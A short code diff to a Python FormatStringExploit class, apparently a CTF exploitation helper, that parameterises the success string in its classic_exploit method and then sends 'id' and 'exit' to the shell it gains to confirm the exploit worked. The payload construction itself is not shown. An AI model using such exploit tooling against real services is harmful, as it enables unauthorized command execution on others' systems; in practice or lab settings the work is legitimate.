@@ -592,11 +592,13 @@ class FormatStringExploit:
     ## EXPLOIT METHODS ##
     # region
 
-    def classic_exploit(self, address_overwrite, address_wanted, interactive=False):
+    def classic_exploit(self, address_overwrite, address_wanted, win_str, interactive=False):
         """
         Perform the classic format string exploit.
         :param address_overwrite: The address to overwrite
         :param address_wanted: The address to write to
+        :param win_str: The string before send `id` command to check if the exploit was successful
+        :param interactive: Whether to start an interactive session after the exploit
         :return: The response from the target service if not interactive, otherwise None
         """
         if self.offset is None:
@@ -618,7 +620,8 @@ class FormatStringExploit:
             self.dispatcher.interactive()
             self.dispatcher.close()
         else:
-            self.dispatcher.receive_response("Yeah dude ! You win !\n", close_process=False)
+
+            self.dispatcher.receive_response(win_str, close_process=False)
             self.dispatcher.client.p.send(b"id\nexit\n")
             response = self.dispatcher.receive_response(close_process=False)
             if self.verbose:
